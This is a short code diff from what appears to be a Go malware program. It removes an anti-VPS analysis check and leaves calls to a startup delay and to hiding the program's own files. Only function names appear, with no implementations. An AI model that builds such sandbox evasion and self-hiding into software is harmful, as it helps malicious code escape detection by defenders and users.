@@ -9,11 +9,6 @@ func main() {
 		os.Exit(0)
 	}
 
-	analysisMode := strings.TrimSpace(antiAnalysisMode)
-	if strings.EqualFold(analysisMode, "AntiVps") || strings.EqualFold(analysisMode, "Full") {
-		checkAntiVps()
-	}
-
 	applyStartupDelay()
 
 	hideSelfFiles()
